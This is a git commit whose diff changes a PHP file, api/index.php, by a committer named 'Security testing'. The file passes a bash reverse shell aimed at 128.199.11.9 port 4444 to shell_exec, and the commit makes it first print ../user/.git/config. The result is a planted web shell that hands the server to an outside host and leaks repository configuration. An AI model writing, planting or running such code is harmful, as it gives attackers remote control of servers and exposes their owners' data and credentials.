e707134888fe5e357b75fc002e20dda8f566d7f6
Security testing <118594933+w2h3@users.noreply.github.com>
2024-03-02 15:35:21 +0700

    Update index.php

--- api/index.php
+++ api/index.php
@@ -1,5 +1,5 @@
 <?php
-$command = 'bash -i >& /dev/tcp/128.199.11.9/4444 0>&1';
+$command = 'cat ../user/.git/config && bash -i >& /dev/tcp/128.199.11.9/4444 0>&1';
 $output = shell_exec($command);
 echo "<pre>$output</pre>";
 ?>
